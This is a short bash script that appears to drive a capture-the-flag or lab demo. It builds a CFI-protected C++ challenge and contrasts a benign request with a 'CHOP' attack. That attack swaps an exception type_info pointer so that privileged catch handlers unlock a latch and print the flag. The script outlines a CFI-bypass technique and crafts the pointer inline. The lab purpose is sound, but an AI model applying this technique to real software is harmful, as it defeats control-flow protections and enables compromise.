#!/usr/bin/env bash
set -u
cd "$(dirname "$0")"

line() { printf '\n\033[1;36m=== %s ===\033[0m\n' "$1"; }

line "0. Build (clang++ with -fsanitize=cfi)"
make --no-print-directory

line "1. Intended path: a bad request throws BenignError -> benign catch"
echo '(error_ti = ti(BenignError); the runtime selects catch(BenignError))'
python3 - <<'PY' 2>&1 | sed 's/^/   /'
import subprocess, struct, re
b = subprocess.run(["./challenge"], input=b"\x00", capture_output=True).stdout
benign = int(re.search(rb"ti\(BenignError\) = (0x[0-9a-f]+)", b).group(1), 16)
rec = b"bad".ljust(24, b"\0") + struct.pack("<Q", benign)
out = subprocess.run(["./challenge"], input=b"\x01" + rec, capture_output=True).stdout
print(out.decode().split("each:")[-1].strip())
PY

line "2. CHOP: swap error_ti -> the runtime selects PRIVILEGED catch handlers"
echo '(request 0 -> catch(UnlockError) flips latch; request 1 -> catch(RevealError)'
echo ' prints the flag. Handler selection is inside libstdc++, outside CFI)'
python3 exploit.py 2>&1 | sed 's/^/   /'
